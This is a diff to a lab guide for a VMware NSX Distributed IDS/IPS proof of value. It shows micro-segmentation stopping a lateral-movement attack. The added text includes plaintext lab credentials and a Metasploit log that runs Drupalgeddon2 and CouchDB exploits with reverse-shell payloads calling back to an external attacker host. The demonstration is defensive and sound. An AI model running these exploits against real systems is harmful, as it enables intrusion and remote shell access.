@@ -165,7 +165,7 @@ Active sessions
 
 ***Confirm IDS/IPS Events show up in the NSX Manager UI***
 1.	In the NSX Manager UI, navigate to Security --> East West Security --> Distributed IDS
-4. Confirm 4 signatures have fired:
+2. Confirm 4 signatures have fired:
     * Signature for **DrupalGeddon2**, with **APP-1-WEB-TIER** as Affected VM
     * Signature for **Remote Code execution via a PHP script**, with **APP-1-WEB-TIER** as Affected VM
     * Signature for **Apache CouchDB Remote Code Execution**, with **APP-1-WEB-TIER** and  **APP-1-APP-TIER** as Affected VMs
@@ -246,8 +246,131 @@ Now that we have isolated production from development workloads, we will micro-s
     * Applied To: **APP2-WEB** , **APP2-APP** 
     * Action: **Allow**
 9. We now have configured the appropriate allow-list policy for APP1 and APP2. Now we can change the default Distributed Firewall action from **Allow** to **Drop** in order to block all traffic except for the traffic we just allowed for our applications to function. 
+10. Click the down arrow next to the **Default Layer3 Section** Policy and change the action of the **Default Layer 3 rule** from **Allow** to **Drop**
+11. Click **PUBLISH** to save and publish your changes.
+
+  ![](assets/images/IDPS_POC_41.PNG)
+
+***Open a SSH/Console session to the External VM***
+1.	If your computer has access to the IP address you've assigend to the **External VM** (10.114.209.151 in my example), open your ssh client and initiate a session to it. Login with the below credentials. 
+    * Username **vmware**
+    * Password **VMware1!**
+2. **Alternatively**, if your computer does not have access to the **External VM** directly, you can access the VM console from the  physical environment vCenter Web-UI. 
+
+***Run through the the lateral attack scenario (again)***
+
+In order to reduce the time needed for this, you can run the **attack2** script from the **external VM** which will initiate the complete lateral attack scenario without needing any manual metasploit steps. If you prefer, you can also manually go though these steps (See the chapter on Lateral Movement Scenario)
+
+1. Type **sudo ./attack2.sh** to run the attack scenario
+
+```console
+vmware@ubuntu:~$ ./attack2.sh
+[sudo] password for vmware:
 
 
+Unable to handle kernel NULL pointer dereference at virtual address 0xd34db33f
+EFLAGS: 00010046
+eax: 00000001 ebx: f77c8c00 ecx: 00000000 edx: f77f0001
+esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60
+ds: 0018   es: 0018  ss: 0018
+Process Swapper (Pid: 0, process nr: 0, stackpage=80377000)
+
+
+Stack: 90909090990909090990909090
+       90909090990909090990909090
+       90909090.90909090.90909090
+       90909090.90909090.90909090
+       90909090.90909090.09090900
+       90909090.90909090.09090900
+       ..........................
+       cccccccccccccccccccccccccc
+       cccccccccccccccccccccccccc
+       ccccccccc.................
+       cccccccccccccccccccccccccc
+       cccccccccccccccccccccccccc
+       .................ccccccccc
+       cccccccccccccccccccccccccc
+       cccccccccccccccccccccccccc
+       ..........................
+       ffffffffffffffffffffffffff
+       ffffffff..................
+       ffffffffffffffffffffffffff
+       ffffffff..................
+       ffffffff..................
+       ffffffff..................
+
+
+Code: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N5 00 00 00 00
+Aiee, Killing Interrupt handler
+Kernel panic: Attempted to kill the idle task!
+In swapper task - not syncing
+
+
+       =[ metasploit v5.0.95-dev                          ]
++ -- --=[ 2038 exploits - 1103 auxiliary - 344 post       ]
++ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: Writing a custom module? After editing your module, why not try the reload command
+
+[*] Processing attack2.rc for ERB directives.
+resource (attack2.rc)> use exploit/unix/webapp/drupal_drupalgeddon2
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+resource (attack2.rc)> set RHOST 192.168.10.101
+RHOST => 192.168.10.101
+resource (attack2.rc)> set RPORT 8080
+RPORT => 8080
+resource (attack2.rc)> exploit -z
+[*] Started reverse TCP handler on 10.114.209.151:4444
+[*] Exploit completed, but no session was created.
+resource (attack2.rc)> route add 192.168.20.0/24 1
+[-] Not a session: 1
+resource (attack2.rc)> use exploit/linux/http/apache_couchdb_cmd_exec
+[*] Using configured payload linux/x64/shell_reverse_tcp
+resource (attack2.rc)> set LPORT 4445
+LPORT => 4445
+resource (attack2.rc)> set LHOST 10.114.209.151
+LHOST => 10.114.209.151
+resource (attack2.rc)> set RHOST 192.168.20.100
+RHOST => 192.168.20.100
+resource (attack2.rc)> exploit -z
+[*] Started reverse TCP handler on 10.114.209.151:4445
+[-] Exploit aborted due to failure: unknown: Something went horribly wrong and we couldn't continue to exploit.
+[*] Exploit completed, but no session was created.
+resource (attack2.rc)> set LPORT 4446
+LPORT => 4446
+resource (attack2.rc)> set RHOST 192.168.20.101
+RHOST => 192.168.20.101
+resource (attack2.rc)> exploit -z
+[*] Started reverse TCP handler on 10.114.209.151:4446
+[-] Exploit aborted due to failure: unknown: Something went horribly wrong and we couldn't continue to exploit.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/http/apache_couchdb_cmd_exec) >
+```
+
+2. Type **sessions -l** to confirm that this time no reverse shell sessions were established. 
+
+```console
+msf5 exploit(linux/http/apache_couchdb_cmd_exec) > sessions -l
+
+Active sessions
+===============
+
+No active sessions.
+```
+> **Note**: The micro-segmentation policy applies allows the applictions to function but reduces the attack surface by preventing any communication to a service that is not explicitely allowed. As a result, while the initial exploit against the vulnerable drupal server was completed, no reverse shell was established as the distributed firewall is not allowing the APP1-WEB-TIER VM to establish a session to the external VM.
+
+***Confirm IDS/IPS Events show up in the NSX Manager UI***
+1.	In the NSX Manager UI, navigate to Security --> East West Security --> Distributed IDS
+2. Confirm 2 signatures have fired:
+    * Signature for **DrupalGeddon2**, with **APP-1-WEB-TIER** as Affected VM
+    * Signature for **Remote Code execution via a PHP script**, with **APP-1-WEB-TIER** as Affected VM
+
+  ![](assets/images/IDPS_POC_39.PNG)
+  
+  > **Note**: While the initial DrupalGeddon exploit has completed, the distributed firewall has prevented the reverse shell from being established from APP-1-WEB-TIER. As a result, the attacker is unable to move laterally in the environment.
+
+This completes the NSX Distributed IDS/IPS PoV. 
 
 ---
 
